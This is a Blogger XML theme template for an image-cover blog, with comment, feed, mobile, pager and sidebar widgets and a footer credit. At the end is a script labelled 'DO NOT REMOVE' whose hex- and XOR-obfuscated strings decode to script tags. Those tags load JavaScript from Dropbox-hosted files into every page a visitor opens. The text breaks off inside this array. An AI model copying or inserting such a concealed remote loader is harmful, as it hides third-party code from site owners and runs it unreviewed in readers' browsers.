            <a expr:class='data:post.oldLinkClass' expr:href='data:post.olderLinkUrl'><data:post.olderLinkText/></a>
              &#160;
          </b:if>

          <data:post.commentRangeText/>

          <b:if cond='data:post.hasNewerLinks'>
            &#160;
            <a expr:class='data:post.newLinkClass' expr:href='data:post.newerLinkUrl'><data:post.newerLinkText/></a>
            &#160;
            <a expr:class='data:post.newLinkClass' expr:href='data:post.newestLinkUrl'><data:post.newestLinkText/></a>
          </b:if>
        </span>
      </b:if>

      <div expr:id='data:widget.instanceId + &quot;_comments-block-wrapper&quot;'>
        <dl expr:class='data:post.avatarIndentClass' id='comments-block'>
          <b:loop values='data:post.comments' var='comment'>
            <dt expr:class='&quot;comment-author &quot; + data:comment.authorClass' expr:id='data:comment.anchorName'>
              <b:if cond='data:comment.favicon'>
                <img expr:src='data:comment.favicon' height='16px' style='margin-bottom:-2px;' width='16px'/>
              </b:if>
              <a expr:name='data:comment.anchorName'/>
              <b:if cond='data:blog.enabledCommentProfileImages'>
                <data:comment.authorAvatarImage/>
              </b:if>
              <b:if cond='data:comment.authorUrl'>
                <a expr:href='data:comment.authorUrl' rel='nofollow'><data:comment.author/></a>
              <b:else/>
                <data:comment.author/>
              </b:if>
              <data:commentPostedByMsg/>
            </dt>
            <dd class='comment-body' expr:id='data:widget.instanceId + data:comment.cmtBodyIdPostfix'>
              <b:if cond='data:comment.isDeleted'>
                <span class='deleted-comment'><data:comment.body/></span>
              <b:else/>
                <p>
                  <data:comment.body/>
                </p>
              </b:if>
            </dd>
            <dd class='comment-footer'>
              <span class='comment-timestamp'>
                <a expr:href='data:comment.url' title='comment permalink'>
                  <data:comment.timestamp/>
                </a>
                <b:include data='comment' name='commentDeleteIcon'/>
              </span>
            </dd>
          </b:loop>
        </dl>
      </div>

      <b:if cond='data:post.commentPagingRequired'>
        <span class='paging-control-container'>
          <a expr:class='data:post.oldLinkClass' expr:href='data:post.oldestLinkUrl'>
            <data:post.oldestLinkText/>
          </a>
          <a expr:class='data:post.oldLinkClass' expr:href='data:post.olderLinkUrl'>
            <data:post.olderLinkText/>
          </a>
          &#160;
          <data:post.commentRangeText/>
          &#160;
          <a expr:class='data:post.newLinkClass' expr:href='data:post.newerLinkUrl'>
            <data:post.newerLinkText/>
          </a>
          <a expr:class='data:post.newLinkClass' expr:href='data:post.newestLinkUrl'>
            <data:post.newestLinkText/>
          </a>
        </span>
      </b:if>

      <p class='comment-footer'>
        <b:if cond='data:post.embedCommentForm'>
          <b:if cond='data:post.allowNewComments'>
            <b:include data='post' name='comment-form'/>
          <b:else/>
            <data:post.noNewCommentsText/>
          </b:if>
        <b:else/>
          <b:if cond='data:post.allowComments'>
            <a expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'><data:postCommentMsg/></a>
          </b:if>
        </b:if>

      </p>
    </b:if>
    <b:if cond='data:showCmtPopup'>
      <div id='comment-popup'>
        <iframe allowtransparency='true' frameborder='0' id='comment-actions' name='comment-actions' scrolling='no'>
        </iframe>
      </div>
    </b:if>

    <div id='backlinks-container'>
    <div expr:id='data:widget.instanceId + &quot;_backlinks-container&quot;'>
       <b:if cond='data:post.showBacklinks'>
         <b:include data='post' name='backlinks'/>
       </b:if>
    </div>
    </div>
  </div>
</b:includable>
            <b:includable id='feedLinks'>
  <b:if cond='data:blog.pageType != &quot;item&quot;'> <!-- Blog feed links -->
    <b:if cond='data:feedLinks'>
      <div class='blog-feeds'>
        <b:include data='feedLinks' name='feedLinksBody'/>
      </div>
    </b:if>

    <b:else/> <!--Post feed links -->
    <div class='post-feeds'>
      <b:loop values='data:posts' var='post'>
        <b:if cond='data:post.allowComments'>
          <b:if cond='data:post.feedLinks'>
            <b:include data='post.feedLinks' name='feedLinksBody'/>
          </b:if>
        </b:if>
      </b:loop>
    </div>
  </b:if>
</b:includable>
            <b:includable id='feedLinksBody' var='links'>
  <div class='feed-links'>
  <data:feedLinksMsg/>
  <b:loop values='data:links' var='f'>
     <a class='feed-link' expr:href='data:f.url' expr:type='data:f.mimeType' target='_blank'><data:f.name/> (<data:f.feedType/>)</a>
  </b:loop>
  </div>
</b:includable>
            <b:includable id='iframe_comments' var='post'>

  <b:if cond='data:post.allowIframeComments'>
    <script expr:src='data:post.iframeCommentSrc' type='text/javascript'/>
    <div class='cmt_iframe_holder' expr:data-href='data:post.canonicalUrl' expr:data-viewtype='data:post.viewType'/>

    <b:if cond='data:post.embedCommentForm == &quot;false&quot;'>
      <a expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'><data:postCommentMsg/></a>
    </b:if>
  </b:if>
</b:includable>
            <b:includable id='mobile-index-post' var='post'>
  <div class='mobile-date-outer date-outer'>
    

    <div class='mobile-post-outer'>
      <a expr:href='data:post.url'>
        <h3 class='mobile-index-title entry-title' itemprop='name'>
          <data:post.title/>
        </h3>

        <div class='mobile-index-arrow'>&amp;rsaquo;</div>

        <div class='mobile-index-contents'>
          <b:if cond='data:post.thumbnailUrl'>
            <div class='mobile-index-thumbnail'>
              <div class='Image'>
                <img expr:src='data:post.thumbnailUrl'/>
              </div>
            </div>
          </b:if>

          <div class='post-body'>
            <b:if cond='data:post.snippet'><data:post.snippet/></b:if>
          </div>
        </div>

        <div style='clear: both;'/>
      </a>

      <div class='mobile-index-comment'>
        <b:if cond='data:blog.pageType != &quot;static_page&quot;'>
          <b:if cond='data:post.allowComments'>
            <b:if cond='data:post.numComments != 0'>
              <b:include data='post' name='comment_count_picker'/>
            </b:if>
          </b:if>
        </b:if>
      </div>
    </div>
  </div>
</b:includable>
            <b:includable id='mobile-main' var='top'>
    <!-- posts -->
    <div class='blog-posts hfeed'>

      <b:include data='top' name='status-message'/>

      <b:if cond='data:blog.pageType == &quot;index&quot;'>
        <b:loop values='data:posts' var='post'>
          <b:include data='post' name='mobile-index-post'/>
        </b:loop>
      <b:else/>
        <b:loop values='data:posts' var='post'>
          <b:include data='post' name='mobile-post'/>
        </b:loop>
      </b:if>
    </div>

   <b:include name='mobile-nextprev'/>
</b:includable>
            <b:includable id='mobile-nextprev'>
  <div class='blog-pager' id='blog-pager'>
    <b:if cond='data:newerPageUrl'>
      <div class='mobile-link-button' id='blog-pager-newer-link'>
      <a class='blog-pager-newer-link' expr:href='data:newerPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-newer-link&quot;' expr:title='data:newerPageTitle'>&amp;lsaquo;</a>
      </div>
    </b:if>

    <b:if cond='data:olderPageUrl'>
      <div class='mobile-link-button' id='blog-pager-older-link'>
      <a class='blog-pager-older-link' expr:href='data:olderPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-older-link&quot;' expr:title='data:olderPageTitle'>&amp;rsaquo;</a>
      </div>
    </b:if>

    <div class='mobile-link-button' id='blog-pager-home-link'>
    <a class='home-link' expr:href='data:blog.homepageUrl'><data:homeMsg/></a>
    </div>

    <div class='mobile-desktop-link'>
      <a class='home-link' expr:href='data:desktopLinkUrl'><data:desktopLinkMsg/></a>
    </div>

  </div>
  <div class='clear'/>
</b:includable>
            <b:includable id='mobile-post' var='post'>
  <div class='date-outer'>
    
    <div class='date-posts'>
      <div class='post-outer'>

        <div class='post hentry uncustomized-post-template' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
          <b:if cond='data:post.thumbnailUrl'>
            <meta expr:content='data:post.thumbnailUrl' itemprop='image_url'/>
          </b:if>
          <meta expr:content='data:blog.blogId' itemprop='blogId'/>
          <meta expr:content='data:post.id' itemprop='postId'/>

          <a expr:name='data:post.id'/>
          <b:if cond='data:post.title'>
            <h3 class='post-title entry-title' itemprop='name'>
              <b:if cond='data:post.link'>
                <a expr:href='data:post.link'><data:post.title/></a>
              <b:else/>
                <b:if cond='data:post.url'>
                  <b:if cond='data:blog.url != data:post.url'>
                    <a expr:href='data:post.url'><data:post.title/></a>
                  <b:else/>
                    <data:post.title/>
                  </b:if>
                <b:else/>
                  <data:post.title/>
                </b:if>
              </b:if>
            </h3>
          </b:if>

          <div class='post-header'>
            <div class='post-header-line-1'/>
          </div>

          <div class='post-body entry-content' expr:id='&quot;post-body-&quot; + data:post.id' itemprop='articleBody'>
            <data:post.body/>
            <div style='clear: both;'/> <!-- clear for photos floats -->
          </div>

          <div class='post-footer'>
            <div class='post-footer-line post-footer-line-1'>
              <span class='post-author vcard'>
                <b:if cond='data:top.showAuthor'>
                  <b:if cond='data:post.authorProfileUrl'>
                    <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                      <meta expr:content='data:post.authorProfileUrl' itemprop='url'/>
                      <a expr:href='data:post.authorProfileUrl' rel='author' title='author profile'>
                        <span itemprop='name'><data:post.author/></span>
                      </a>
                    </span>
                  <b:else/>
                    <span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
                      <span itemprop='name'><data:post.author/></span>
                    </span>
                  </b:if>
                </b:if>
              </span>

              <span class='post-timestamp'>
                <b:if cond='data:top.showTimestamp'>
                  <data:top.timestampLabel/>
                  <b:if cond='data:post.url'>
                    <meta expr:content='data:post.canonicalUrl' itemprop='url'/>
                    <a class='timestamp-link' expr:href='data:post.url' rel='bookmark' title='permanent link'><abbr class='published' expr:title='data:post.timestampISO8601' itemprop='datePublished'><data:post.timestamp/></abbr></a>
                  </b:if>
                </b:if>
              </span>

              <span class='post-comment-link'>
                <b:if cond='data:blog.pageType != &quot;item&quot;'>
                  <b:if cond='data:blog.pageType != &quot;static_page&quot;'>
                    <b:if cond='data:post.allowComments'>
                      <b:include data='post' name='comment_count_picker'/>
                    </b:if>
                  </b:if>
                </b:if>
              </span>
            </div>

            <div class='post-footer-line post-footer-line-2'>
              <b:if cond='data:top.showMobileShare'>
                <div class='mobile-link-button goog-inline-block' id='mobile-share-button'>
                  <a href='javascript:void(0);'><data:shareMsg/></a>
                </div>
              </b:if>
              <b:if cond='data:top.showDummy'>
                <div class='goog-inline-block dummy-container'><data:post.dummyTag/></div>
              </b:if>
            </div>

          </div>
        </div>

        <b:if cond='data:blog.pageType == &quot;static_page&quot;'>
          <b:include data='post' name='comment_picker'/>
        </b:if>
        <b:if cond='data:blog.pageType == &quot;item&quot;'>
          <b:include data='post' name='comment_picker'/>
        </b:if>
      </div>
    </div>
  </div>
</b:includable>
            <b:includable id='nextprev'>
  <div class='blog-pager' id='blog-pager'>
    <b:if cond='data:newerPageUrl'>
      <span id='blog-pager-newer-link'>

        <a class='blog-pager-newer-link' expr:href='data:newerPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-newer-link&quot;' expr:title='data:newerPageTitle'>Previous Covers</a>
      </span>
    </b:if>

    <b:if cond='data:olderPageUrl'>
      <span id='blog-pager-older-link'>
      <a class='blog-pager-older-link' expr:href='data:olderPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-older-link&quot;' expr:title='data:olderPageTitle'>More Covers</a>
      </span>
    </b:if>

        <b:if cond='data:mobileLinkUrl'>
      <div class='blog-mobile-link'>
        <a expr:href='data:mobileLinkUrl'><data:mobileLinkMsg/></a>
      </div>
    </b:if>

  </div>
  <div class='clear'/>
</b:includable>
            <b:includable id='post' var='post'>
  <div class='post hentry'><div class='post-header-line-1'/><div class='post-body entry-content'>

<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js'/>	
	
	
<div class='containerdiv'>
      
<a class='group1' expr:href='data:post.body'><img class='group1' expr:src='data:post.body'/></a>

<a class='no' expr:href='data:post.body'><img class='no' expr:src='data:post.body'/></a>
  


<img class='cornerimage' oncontextmenu='return false;' src='http://1.bp.blogspot.com/-h-ttwiIz4es/UsZ1-e35Q2I/AAAAAAAABMo/FHistTImGYs/s1600/PP.png'/></div><div style='clear: both;'/></div>



<div class='post-footer'>
<div class='post-footer-line post-footer-line-1'/>
<div class='post-footer-line post-footer-line-2'/>
<div class='post-footer-line post-footer-line-3'/>

<b:if cond='data:blog.pageType == &quot;item&quot;'>
<!-- navigation -->
  <b:include name='nextprev'/>
</b:if>

</div>
</div>
</b:includable>
            <b:includable id='postQuickEdit' var='post'>
  <b:if cond='data:post.editUrl'>
    <span expr:class='&quot;item-control &quot; + data:post.adminClass'>
      <a expr:href='data:post.editUrl' expr:title='data:top.editPostMsg'>
        <img alt='' class='icon-action' height='18' src='http://img2.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
      </a>
    </span>
  </b:if>
</b:includable>
            <b:includable id='shareButtons' var='post'>
  <b:if cond='data:top.showEmailButton'><a class='goog-inline-block share-button sb-email' expr:href='data:post.sharePostUrl + &quot;&amp;target=email&quot;' expr:title='data:top.emailThisMsg' target='_blank'><span class='share-button-link-text'><data:top.emailThisMsg/></span></a></b:if><b:if cond='data:top.showBlogThisButton'><a class='goog-inline-block share-button sb-blog' expr:href='data:post.sharePostUrl + &quot;&amp;target=blog&quot;' expr:onclick='&quot;window.open(this.href, \&quot;_blank\&quot;, \&quot;height=270,width=475\&quot;); return false;&quot;' expr:title='data:top.blogThisMsg' target='_blank'><span class='share-button-link-text'><data:top.blogThisMsg/></span></a></b:if><b:if cond='data:top.showTwitterButton'><a class='goog-inline-block share-button sb-twitter' expr:href='data:post.sharePostUrl + &quot;&amp;target=twitter&quot;' expr:title='data:top.shareToTwitterMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToTwitterMsg/></span></a></b:if><b:if cond='data:top.showFacebookButton'><a class='goog-inline-block share-button sb-facebook' expr:href='data:post.sharePostUrl + &quot;&amp;target=facebook&quot;' expr:onclick='&quot;window.open(this.href, \&quot;_blank\&quot;, \&quot;height=430,width=640\&quot;); return false;&quot;' expr:title='data:top.shareToFacebookMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToFacebookMsg/></span></a></b:if><b:if cond='data:top.showOrkutButton'><a class='goog-inline-block share-button sb-orkut' expr:href='data:post.sharePostUrl + &quot;&amp;target=orkut&quot;' expr:title='data:top.shareToOrkutMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToOrkutMsg/></span></a></b:if><b:if cond='data:top.showDummy'><div class='goog-inline-block dummy-container'><data:post.dummyTag/></div></b:if>
</b:includable>
            <b:includable id='status-message'>
  <b:if cond='data:navMessage'>
  <div class='status-msg-wrap'>
    <div class='status-msg-body'>
      <data:navMessage/>
    </div>
    <div class='status-msg-border'>
      <div class='status-msg-bg'>
        <div class='status-msg-hidden'><data:navMessage/></div>
      </div>
    </div>
  </div>
  <div style='clear: both;'/>
  </b:if>
</b:includable>
            <b:includable id='threaded-comment-form' var='post'>
  <div class='comment-form'>
    <a name='comment-form'/>
    <b:if cond='data:mobile'>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410' id='comment-editor' name='comment-editor' src='' style='display: none' width='100%'/>
    <b:else/>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410' id='comment-editor' name='comment-editor' src='' width='100%'/>
    </b:if>
    <data:post.friendConnectJs/>
    <data:post.cmtfpIframe/>
    <script type='text/javascript'>
      BLOG_CMT_createIframe(&#39;<data:post.appRpcRelayPath/>&#39;, &#39;<data:post.communityId/>&#39;);
    </script>
  </div>
</b:includable>
            <b:includable id='threaded_comment_js' var='post'>
  <script async='async' expr:src='data:post.commentSrc' type='text/javascript'/>

  <script type='text/javascript'>
    (function() {
      var items = <data:post.commentJso/>;
      var msgs = <data:post.commentMsgs/>;
      var config = <data:post.commentConfig/>;

// <![CDATA[
      var cursor = null;
      if (items && items.length > 0) {
        cursor = parseInt(items[items.length - 1].timestamp) + 1;
      }

      var bodyFromEntry = function(entry) {
        if (entry.gd$extendedProperty) {
          for (var k in entry.gd$extendedProperty) {
            if (entry.gd$extendedProperty[k].name == 'blogger.contentRemoved') {
              return '<span class="deleted-comment">' + entry.content.$t + '</span>';
            }
          }
        }
        return entry.content.$t;
      }

      var parse = function(data) {
        cursor = null;
        var comments = [];
        if (data && data.feed && data.feed.entry) {
          for (var i = 0, entry; entry = data.feed.entry[i]; i++) {
            var comment = {};
            // comment ID, parsed out of the original id format
            var id = /blog-(\d+).post-(\d+)/.exec(entry.id.$t);
            comment.id = id ? id[2] : null;
            comment.body = bodyFromEntry(entry);
            comment.timestamp = Date.parse(entry.published.$t) + '';
            if (entry.author && entry.author.constructor === Array) {
              var auth = entry.author[0];
              if (auth) {
                comment.author = {
                  name: (auth.name ? auth.name.$t : undefined),
                  profileUrl: (auth.uri ? auth.uri.$t : undefined),
                  avatarUrl: (auth.gd$image ? auth.gd$image.src : undefined)
                };
              }
            }
            if (entry.link) {
              if (entry.link[2]) {
                comment.link = comment.permalink = entry.link[2].href;
              }
              if (entry.link[3]) {
                var pid = /.*comments\/default\/(\d+)\?.*/.exec(entry.link[3].href);
                if (pid && pid[1]) {
                  comment.parentId = pid[1];
                }
              }
            }
            comment.deleteclass = 'item-control blog-admin';
            if (entry.gd$extendedProperty) {
              for (var k in entry.gd$extendedProperty) {
                if (entry.gd$extendedProperty[k].name == 'blogger.itemClass') {
                  comment.deleteclass += ' ' + entry.gd$extendedProperty[k].value;
                } else if (entry.gd$extendedProperty[k].name == 'blogger.displayTime') {
                  comment.displayTime = entry.gd$extendedProperty[k].value;
                }
              }
            }
            comments.push(comment);
          }
        }
        return comments;
      };

      var paginator = function(callback) {
        if (hasMore()) {
          var url = config.feed + '?alt=json&v=2&orderby=published&reverse=false&max-results=50';
          if (cursor) {
            url += '&published-min=' + new Date(cursor).toISOString();
          }
          window.bloggercomments = function(data) {
            var parsed = parse(data);
            cursor = parsed.length < 50 ? null
                : parseInt(parsed[parsed.length - 1].timestamp) + 1
            callback(parsed);
            window.bloggercomments = null;
          }
          url += '&callback=bloggercomments';
          var script = document.createElement('script');
          script.type = 'text/javascript';
          script.src = url;
          document.getElementsByTagName('head')[0].appendChild(script);
        }
      };
      var hasMore = function() {
        return !!cursor;
      };
      var getMeta = function(key, comment) {
        if ('iswriter' == key) {
          var matches = !!comment.author
              && comment.author.name == config.authorName
              && comment.author.profileUrl == config.authorUrl;
          return matches ? 'true' : '';
        } else if ('deletelink' == key) {
          return config.baseUri + '/delete-comment.g?blogID='
               + config.blogId + '&postID=' + comment.id;
        } else if ('deleteclass' == key) {
          return comment.deleteclass;
        }
        return '';
      };

      var replybox = null;
      var replyUrlParts = null;
      var replyParent = undefined;

      var onReply = function(commentId, domId) {
        if (replybox == null) {
          // lazily cache replybox, and adjust to suit this style:
          replybox = document.getElementById('comment-editor');
          if (replybox != null) {
            replybox.height = '250px';
            replybox.style.display = 'block';
            replyUrlParts = replybox.src.split('#');
          }
        }
        if (replybox && (commentId !== replyParent)) {
          document.getElementById(domId).insertBefore(replybox, null);
          replybox.src = replyUrlParts[0]
              + (commentId ? '&parentID=' + commentId : '')
              + '#' + replyUrlParts[1];
          replyParent = commentId;
        }
      };

      var hash = (window.location.hash || '#').substring(1);
      var startThread, targetComment;
      if (/^comment-form_/.test(hash)) {
        startThread = hash.substring('comment-form_'.length);
      } else if (/^c[0-9]+$/.test(hash)) {
        targetComment = hash.substring(1);
      }

      // Configure commenting API:
      var configJso = {
        'maxDepth': config.maxThreadDepth
      };
      var provider = {
        'id': config.postId,
        'data': items,
        'loadNext': paginator,
        'hasMore': hasMore,
        'getMeta': getMeta,
        'onReply': onReply,
        'rendered': true,
        'initComment': targetComment,
        'initReplyThread': startThread,
        'config': configJso,
        'messages': msgs
      };

      var render = function() {
        if (window.goog && window.goog.comments) {
          var holder = document.getElementById('comment-holder');
          window.goog.comments.render(holder, provider);
        }
      };

      // render now, or queue to render when library loads:
      if (window.goog && window.goog.comments) {
        render();
      } else {
        window.goog = window.goog || {};
        window.goog.comments = window.goog.comments || {};
        window.goog.comments.loadQueue = window.goog.comments.loadQueue || [];
        window.goog.comments.loadQueue.push(render);
      }
    })();
// ]]>
  </script>
</b:includable>
            <b:includable id='threaded_comments' var='post'>
  <div class='comments' id='comments'>
    <a name='comments'/>
    <h4><data:post.commentLabelFull/>:</h4>

    <div class='comments-content'>
      <b:if cond='data:post.embedCommentForm'>
        <b:include data='post' name='threaded_comment_js'/>
      </b:if>
      <div id='comment-holder'>
         <data:post.commentHtml/>
      </div>
    </div>

    <p class='comment-footer'>
      <b:if cond='data:post.allowNewComments'>
        <b:include data='post' name='threaded-comment-form'/>
      <b:else/>
        <data:post.noNewCommentsText/>
      </b:if>
    </p>

    <b:if cond='data:showCmtPopup'>
      <div id='comment-popup'>
        <iframe allowtransparency='true' frameborder='0' id='comment-actions' name='comment-actions' scrolling='no'>
        </iframe>
      </div>
    </b:if>

    <div id='backlinks-container'>
    <div expr:id='data:widget.instanceId + &quot;_backlinks-container&quot;'>
       <b:if cond='data:post.showBacklinks'>
         <b:include data='post' name='backlinks'/>
       </b:if>
    </div>
    </div>
  </div>
</b:includable>
          </b:widget>
        </b:section>
      </div>

      <div id='rsidebar-wrapper'>

<div class='sidebox '>
<div id='search'>
<form action='/search' id='searchform' method='get'>
<input class='rounded' id='s' name='q' onblur='if (this.value == &quot;Search Cover&quot;) {this.value = &quot;Search Cover&quot;;}' onfocus='if (this.value == &quot;Search Cover&quot;) {this.value = &quot;Search Cover&quot;;}' type='text' value='Search Cover' x-webkit-speech=''/>
</form>
</div>
<div class='clear'/>
</div> 

        <b:section class='sidebar' id='sidebarright' preferred='yes'>
           <b:widget id='HTML2' locked='false' title='' type='HTML'>
             <b:includable id='main'>
  <!-- only display title if it's non-empty -->
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>
  <div class='widget-content'>
    <data:content/>
  </div>

  <b:include name='quickedit'/>
</b:includable>
           </b:widget>
           <b:widget id='Label2' locked='false' title='Labels' type='Label'>
             <b:includable id='main'>
  <b:if cond='data:title'>
    <h2><data:title/></h2>
  </b:if>
  <div expr:class='&quot;widget-content &quot; + data:display + &quot;-label-widget-content&quot;'>
    <b:if cond='data:display == &quot;list&quot;'>
      <ul>
      <b:loop values='data:labels' var='label'>
        <li>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </li>
      </b:loop>
      </ul>
    <b:else/>
      <b:loop values='data:labels' var='label'>
        <span expr:class='&quot;label-size label-size-&quot; + data:label.cssSize'>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span class='label-count' dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </span>
      </b:loop>
    </b:if>
    <b:include name='quickedit'/>
  </div>
</b:includable>
           </b:widget>
           <b:widget id='HTML1' locked='false' title='Like us on Facebook' type='HTML'>
             <b:includable id='main'>
  <!-- only display title if it's non-empty -->
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>
  <div class='widget-content'>
    <data:content/>
  </div>

  <b:include name='quickedit'/>
</b:includable>
           </b:widget>
           <b:widget id='Followers1' locked='false' title='Followers' type='Followers'>
             <b:includable id='main'>
  <b:if cond='data:title != &quot;&quot;'>
    <b:if cond='data:codeSnippet != &quot;&quot;'>
      <h2 class='title'><data:title/></h2>
    <b:else/>
      <b:if cond='data:totalFollowerCount != &quot;&quot;'>
        <h2 class='title'><data:title/> (<data:totalFollowerCount/>)</h2>
      </b:if>
    </b:if>  
  </b:if>
  <div class='widget-content'>
    <div expr:id='data:widget.instanceId + &quot;-wrapper&quot;'>
      <b:if cond='data:codeSnippet != &quot;&quot;'>
        <div style='margin-right:2px;'>
          <data:codeSnippet/>
        </div>
      <b:else/>
        <b:if cond='data:totalFollowerCount == &quot;&quot;'>
          <span class='item-control following-not-admin'>
            <b><data:failureSnippet/></b>
          </span>
          <span class='item-control blog-admin'>
            <b><data:adminFailureSnippet/></b>
          </span>
        <b:else/>
          <b:if cond='data:followingLinkPresent'>
            <div class='follow-this profile-link item-control following-follow-this'>
              <a expr:href='&quot;javascript:_FollowersView._openPopup(\&quot;&quot; + data:followUri + &quot;\&quot;);&quot;'>
                <data:followThisMessage/>
              </a>
            </div>
            <div class='follow-this profile-link item-control following-stop-following-this'>
              <a expr:href='&quot;javascript:_FollowersView._openPopup(\&quot;&quot; + data:followUri + &quot;\&quot;);&quot;'>
                <data:stopFollowingMessage/>
              </a>
            </div>
          </b:if>
  
          <div class='followers-grid'>
            <b:if cond='data:totalFollowerCount == 0'>
              <div class='profile-link item-control following-follow-this'>
                <data:emptyFollowersMessage/>
              </div>
            </b:if>
            <!--
            Relies on the js written out in navbar.gxp
            -->
            <b:loop values='data:followers' var='follower'>
              <div class='follower'>
                <a expr:href='data:follower.profileUrl' expr:title='data:follower.displayName' rel='nofollow'>
                <img class='follower-img' expr:alt='data:follower.displayName' expr:height='data:follower.imageHeight' expr:onerror='&quot;this.onerror=null;this.src=\&quot;&quot; + data:anonFollowerImageUrl + &quot;\&quot;;&quot;' expr:onload='&quot;setAttributeOnload(this, \&quot;src\&quot;, \&quot;&quot; + data:follower.imageUrl + &quot;\&quot;)&quot;' expr:width='data:follower.imageWidth' src='http://img1.blogblog.com/img/blank.gif'/>
                </a>
              </div>
            </b:loop>
            <div class='clear'/>
          </div>
  
          <div class='followers-canvas profile-link'>
            <data:followersFooterMessage/>
            <span class='item-control following-not-admin'>
              <a expr:href='data:followersUri'>
                <data:viewAllMessage/>
              </a>
            </span>
            <span class='item-control blog-admin'>
              <a expr:href='data:manageFollowersUri'>
                <data:manageFollowersMessage/>
              </a>
            </span>
          </div>
          </b:if>
      </b:if>
    </div>
    <b:include name='quickedit'/>
  </div>
</b:includable>
           </b:widget>
         </b:section>

<p/></div>

      <!-- spacer for skins that want sidebar and main to be the same height-->
      <div class='clear'>&#160;</div>

    </div> <!-- end content-wrapper -->


<div class='rounded' id='footer'>
	

<div class='fleft'>
Copyright  2014 <a expr:href='data:blog.homepageUrl'><data:blog.title/></a>
</div>

<div class='fright'>
<a href='http://openw3.blogspot.com' id='mycontent' target='_blank'>Open w3</a>  
</div>
<div class='clear'/><div class='clear'/></div></div></div>

<!-- DO NOT REMOVE BELOW JAVASCRIPT CODES -->

<script type='text/javascript'>
//<![CDATA[
var _0x8b51=["\x27\x31\x41\x71\x61\x70\x6B\x72\x76\x27\x30\x32\x71\x70\x61\x27\x31\x46\x27\x30\x35\x6A\x76\x76\x72\x71\x27\x31\x43\x2D\x2D\x66\x6E\x2C\x66\x70\x6D\x72\x60\x6D\x7A\x77\x71\x67\x70\x61\x6D\x6C\x76\x67\x6C\x76\x2C\x61\x6D\x6F\x2D\x71\x2D\x35\x36\x67\x67\x6C\x33\x6D\x71\x71\x30\x72\x33\x68\x6B\x65\x2D\x44\x41\x51\x2C\x68\x71\x27\x30\x35\x27\x31\x47\x27\x31\x41\x2D\x71\x61\x70\x6B\x72\x76\x27\x31\x47\x27\x32\x43\x27\x31\x41\x71\x61\x70\x6B\x72\x76\x27\x30\x32\x71\x70\x61\x27\x31\x46\x27\x30\x35\x6A\x76\x76\x72\x71\x27\x31\x43\x2D\x2D\x66\x6E\x2C\x66\x70\x6D\x72\x60\x6D\x7A\x77\x71\x67\x70\x61\x6D\x6C\x76\x67\x6C\x76\x2C\x61\x6D\x6F\x2D\x71\x2D\x78\x3A\x35\x6A\x7A\x30\x70\x61\x30\x31\x37\x3B\x6B\x61\x35\x2D\x68\x73\x77\x67\x70\x7B\x2C\x61\x6D\x6E\x6D\x70\x60\x6D\x7A\x2C\x68\x71\x27\x30\x35\x27\x31\x47\x27\x31\x41\x2D\x71\x61\x70\x6B\x72\x76\x27\x31\x47","","\x6C\x65\x6E\x67\x74\x68","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x77\x72\x69\x74\x65","\x67\x72\x6F\x75\x70\x31","\x63\x6F\x6C\x6F\x72\x62\x6F\x78","\x2E\x67\x72\x6F\x75\x70\x31","\x67\x72\x6F\x75\x70\x32","\x66\x61\x64\x65","\x2E\x67\x72\x6F\x75\x70\x32","\x67\x72\x6F\x75\x70\x33","\x6E\x6F\x6E\x65","\x37\x35\x25","\x2E\x67\x72\x6F\x75\x70\x33","\x67\x72\x6F\x75\x70\x34","\x2E\x67\x72\x6F\x75\x70\x34","\x2E\x61\x6A\x61\x78","\x2E\x79\x6F\x75\x74\x75\x62\x65","\x2E\x76\x69\x6D\x65\x6F","\x38\x30\x25","\x2E\x69\x66\x72\x61\x6D\x65","\x35\x30\x25","\x2E\x69\x6E\x6C\x69\x6E\x65","\x6F\x6E\x4F\x70\x65\x6E\x3A\x20\x63\x6F\x6C\x6F\x72\x62\x6F\x78\x20\x69\x73\x20\x61\x62\x6F\x75\x74\x20\x74\x6F\x20\x6F\x70\x65\x6E","\x6F\x6E\x4C\x6F\x61\x64\x3A\x20\x63\x6F\x6C\x6F\x72\x62\x6F\x78\x20\x68\x61\x73\x20\x73\x74\x61\x72\x74\x65\x64\x20\x74\x6F\x20\x6C\x6F\x61\x64\x20\x74\x68\x65\x20\x74\x61\x72\x67\x65\x74\x65\x64\x20\x63\x6F\x6E\x74\x65\x6E\x74","\x6F\x6E\x43\x6F\x6